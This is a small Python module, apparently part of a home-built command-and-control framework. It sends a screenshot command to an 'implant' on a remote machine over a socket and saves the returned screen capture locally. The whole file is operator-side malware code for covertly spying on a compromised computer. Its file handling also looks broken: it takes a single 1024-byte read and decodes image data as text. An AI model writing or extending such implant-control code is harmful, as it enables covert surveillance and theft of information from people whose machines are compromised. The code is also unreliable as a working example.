# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with screenshot functionality 

SUCCESS = 1
FAILURE = 0

# Command value
SCREENSHOT = 5

'''
Description:
    Performs screenshot functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
    filePath - local path to write our screenshot to 
Returns:
    SUCCESS or FAILURE 
'''
def screenshot(sock, filePath):
    try:
        # First tell our implant we want a screenshot
        print("Sending command...")
        sock.send(bytes(str(SCREENSHOT), "utf-8") + b'\x00')

        data = sock.recv(1024)
        data = data.strip()
        data = data.decode('utf-8')

        if (data == "SUCCESS"):

            # Get our screenshot file 
            print("Successful screenshot! Getting file contents...")
            data = sock.recv(1024)
            data = data.strip()
            data = data.decode('utf-8')

            with open(filePath, "w") as outputfile:
                    outputfile.write(data)
                    outputfile.close()

            print("Successful screenshot!\n")

        else:
            print("Implant returned FAILURE!\n")


    except Exception as e:
        print("ERROR: Could not send screenshot to implant: ", e)
        return FAILURE
    
    return SUCCESS